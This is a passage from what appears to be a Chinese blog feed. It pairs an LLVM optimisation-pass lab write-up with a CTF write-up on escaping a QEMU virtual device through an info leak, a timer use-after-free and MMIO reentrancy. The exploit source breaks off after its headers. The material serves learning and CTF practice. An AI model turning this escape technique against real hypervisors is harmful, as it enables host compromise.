class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getshift</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">if</span>(!((x &gt; <span class="number">0</span>) &amp;&amp; !(x &amp; (x - <span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span>(x)</span><br><span class="line">  {</span><br><span class="line">    x = x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">StrengthReductionPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line">        Value* oper;</span><br><span class="line">        <span class="keyword">auto</span> oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 =In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> shift1 = <span class="number">-1</span>,shift2 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br><span class="line">          shift1 = <span class="built_in">getshift</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2))</span><br><span class="line">          shift2 = <span class="built_in">getshift</span>(<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper2)-&gt;<span class="built_in">getSExtValue</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">        <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">        <span class="keyword">case</span> Instruction::UDiv:</span><br><span class="line">          <span class="keyword">if</span>((<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1)&amp;&amp;shift1!=<span class="number">-1</span>)||(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2)&amp;&amp;shift2!=<span class="number">-1</span>))</span><br><span class="line">          {</span><br><span class="line">            shift = shift1==<span class="number">-1</span> ? shift2 : shift1;</span><br><span class="line">            oper = shift1==<span class="number">-1</span>? oper1 : oper2;</span><br><span class="line">            </span><br><span class="line">            IRBuilder&lt;&gt; <span class="built_in">builder</span>(&amp;In);</span><br><span class="line">            </span><br><span class="line">            Value* NewIns;</span><br><span class="line">            <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">            {</span><br><span class="line">            <span class="keyword">case</span> Instruction::Mul:</span><br><span class="line">              NewIns = builder.<span class="built_in">CreateShl</span>(oper,shift);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Instruction::SDiv:</span><br><span class="line">            <span class="keyword">case</span> Instruction::UDiv:</span><br><span class="line">              NewIns =builder.<span class="built_in">CreateAShr</span>(oper,shift);</span><br><span class="line">              <span class="keyword">break</span>;            </span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            In.<span class="built_in">replaceAllUsesWith</span>(NewIns);</span><br><span class="line">            del_InsList.<span class="built_in">push_back</span>(&amp;In);</span><br><span class="line">            cnt++;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @StrengthReduction(i32 noundef %0) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"strength-reduction: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity,strength-reduction ./test/TestCase2.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><p>优化前:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @StrengthReduction(i32 noundef %0) {</span><br><span class="line">  %2 = mul nsw i32 %0, 2</span><br><span class="line">  %3 = mul nsw i32 64, %0</span><br><span class="line">  %4 = sdiv i32 %0, 4</span><br><span class="line">  %5 = sdiv i32 %0, 128</span><br><span class="line">  %6 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>优化后:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @StrengthReduction(i32 noundef %0) {</span><br><span class="line">  %2 = shl i32 %0, 1</span><br><span class="line">  %3 = shl i32 %0, 6</span><br><span class="line">  %4 = ashr i32 %0, 2</span><br><span class="line">  %5 = ashr i32 %0, 7</span><br><span class="line">  %6 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Multi-Instruction-Optimization"><a href="#Multi-Instruction-Optimization" class="headerlink" title="Multi-Instruction Optimization"></a>Multi-Instruction Optimization</h2><h3 id="识别-2"><a href="#识别-2" class="headerlink" title="识别"></a>识别</h3><p>以先加后减运算为例: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = a+b;d = c-a;  --&gt;  c = a+b;d = b;</span><br></pre></td></tr></tbody></table></figure><p>对于指令In,遍历其UserIn,如果UserIn的操作符含义与In的操作符相反(如加与减,乘与除),且UserIn的第二个操作数(减数)与In的任一操作数(加数)均为对同一个Value的引用.</p><p>其实就是UserIn正好抵消In的运算,具体是否可消除模式的识别与操作符本身有关,这里仅以上述先加后减的模式进行优化.</p><h3 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h3><p>以之前的值替换即可.</p><h3 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PreservedAnalyses <span class="title">MultiInstOptPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="type">int</span> op = <span class="number">-1</span> ; <span class="comment">//1 -&gt; + ; 0 -&gt; -;</span></span><br><span class="line">        <span class="type">int</span> Incnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">auto</span> oper1 = In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 = In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">switch</span> (In.<span class="built_in">getOpcode</span>())</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">          <span class="keyword">for</span>(User* user:In.<span class="built_in">users</span>())</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span>(Instruction* UserIn = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(user))</span><br><span class="line">            {</span><br><span class="line">              Value* Val = <span class="literal">NULL</span>;</span><br><span class="line">              <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOpcode</span>() == Instruction::Sub)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == oper1)</span><br><span class="line">                    Val = oper2;</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span>(UserIn-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == oper2)</span><br><span class="line">                    Val = oper1;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span>(Val)</span><br><span class="line">                  {</span><br><span class="line">                    UserIn-&gt;<span class="built_in">replaceAllUsesWith</span>(Val);  </span><br><span class="line">                    del_InsList.<span class="built_in">push_back</span>(UserIn);</span><br><span class="line">                    ++cnt;</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">delIns</span>(del_InsList);</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {"</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="built_in">outs</span>() &lt;&lt; <span class="string">"multi-inst-opt: "</span> &lt;&lt; cnt &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">none</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; opt -load-pass-plugin=./libLocalOpts.so -passes=algebraic-identity,strength-reduction,multi-inst-opt ./test/TestCaseBasic.ll -o ./TestCase.bc &amp;&amp; llvm-dis TestCase.bc -o TestCase.ll</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {</span><br><span class="line">  %3 = add nsw i32 %0, 3</span><br><span class="line">  %4 = sub nsw i32 %3, 3</span><br><span class="line">  %5 = add nsw i32 %0, %1</span><br><span class="line">  %6 = sub nsw i32 %5, %1</span><br><span class="line">  %7 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @MultiInstOpt(i32 noundef %0, i32 noundef %1) {</span><br><span class="line">  %3 = add nsw i32 %0, 3</span><br><span class="line">  %4 = add nsw i32 %0, %1</span><br><span class="line">  %5 = call i32 (ptr, ...) @printf(ptr noundef @.str.1, i32 noundef %3, i32 noundef %0, i32 noundef %4, i32 noundef %0)</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> CSCD70 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>京麒CTF2023 qemu-mr MMIO重入攻击</title>
      <link href="/2023/JQCTF223%20Qemu-mr%20Recursive-MMIO-Flaws/"/>
      <url>/2023/JQCTF223%20Qemu-mr%20Recursive-MMIO-Flaws/</url>
      
        <content type="html"><![CDATA[<p>有趣的MMIO重入</p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键结构体长这样</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MRState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="type">uint64_t</span> chunk_size;</span><br><span class="line">  <span class="type">int64_t</span> read_size;</span><br><span class="line">  <span class="type">uint64_t</span> read_flag;</span><br><span class="line">  <span class="type">uint64_t</span> free_flag;</span><br><span class="line">  <span class="type">uint64_t</span> chunk_flag;</span><br><span class="line">  <span class="type">uint64_t</span> timer_flag;</span><br><span class="line">  <span class="type">uint64_t</span> clear_flag;</span><br><span class="line">  <span class="type">uint64_t</span> bh_flag;</span><br><span class="line">  <span class="type">uint64_t</span> bh_rw_flag;</span><br><span class="line">  <span class="type">uint64_t</span> physical;</span><br><span class="line">  QEMUTimer_0 *timer;</span><br><span class="line">  <span class="type">char</span> *chunk_ptr;</span><br><span class="line">  <span class="type">uint64_t</span> blk[<span class="number">8</span>];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>mmio_read,一眼丁真的负数溢出.(ps:上面那个比较是无符号比较,没有负数溢出),结合MRState结构体来看,向上溢出读timer指针能够拿到主线程的堆地址,读chunk_ptr能拿到当前线程的堆地址,作为一个Object,可以从基类的free指针中拿到ELF程序的加载地址.<br>(其实按照以前用户态glibc利用的经验,mmap出的多片内存区域的偏移应该是固定的,而线程堆是mmap出来的,讲道理应该能从得到的线程堆地址间接计算libc的地址,但在之前的一些尝试中,这些偏移并不固定.如果有师傅知道为什么,真心求教.)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032058341.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>; <span class="comment">//free -&gt; g_free in ELF.</span></span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>mmio_write可以设置除了clear_flag外的其他flag,然后根据flag执行对应的操作(仅展示操作部分).操作有: 1) dma读写 2) 分配&lt;0x200大小的堆块并从物理地址读取数据. 3)设置timer 4) 释放timer.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032101421.png"></p><p>一看堆的chunk_size可控,且mmio_write时没加锁,于是想到打条件竞争,在一个线程malloc之后,另一个线程进入mmio_write修改chunk_size变量,达成堆溢出.但是观察下面的free操作后,会将clear_flag设置为1,这意味着mmio_write将不再可用,我们仅有1次free操作.而且能溢出的堆块和要释放的堆块甚至不在同一个线程的堆区中(timer空间在qemu主线程中分配,chunk_ptr在触发mmio_write的线程中分配),感觉不太好打.</p><p>于是换一条路走.再来关注这个free掉timer的操作,结合前两天跟的<a href="https://hanqi-blogs.cn/2023/QemuTimer-Callback">QemuTimer Callback机制</a>,瞬间想到这里有个天然的UAF.在激活timer后,timer已经加入到了active_timerlist中,在MRState中将Timer置零没有完全消除对timer结构的访问能力.结合刚刚的堆块分配操作,将释放的timer拿回来并在Timer触发之前劫持其callback指针及参数,即可达成一次任意函数调用.不过还是刚刚的问题,clear_flag会被置1,没办法再次分配堆块.那就再打竞争,在释放timer后设置clear_flag前让另一个线程进行堆块分配并劫持.</p><p>这种方法最终也没有成功,即使我尝试使用gdb控制程序的时序来赢得竞争,但我发现似乎多个线程不能同时进行mmio_write,.(这一点在之后会解释)</p><p>后来根据题目提示,找到了 <a href="https://github.com/QiuhaoLi/CVE-2021-3929-3947">https://github.com/QiuhaoLi/CVE-2021-3929-3947</a> 以及white paper.了解mmio重入的基本原理.<br>于是先将physical地址设置为mmio区域的物理地址,设置好对应标志位,经过这样的过程:<br>先第一次进入mmio_write,向physical区域写入触发mmio重入,第二次进入mmio_write分配chunk并写入(无效操作),激活timer,释放timer.此时clear_flag已经设置,但当第二次mmio_write结束会直接返回到刚刚写入physical区域的指令,也就是检测clear_flag之后,之后即可正常劫持timer.</p><p>引用一下论文中的对MMIO重入的描述.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312032217351.png"></p><p>论文中也提到了在最开始的尝试中无法同时进入mmio_write的原因.</p><blockquote><p>In QEMU,PMIO/MMIO accesses from the guest are protected by a global lock “Big QEMU Lock”[27],so two vCPUs can not simultaneously call into virtual devices.</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef unsigned long long 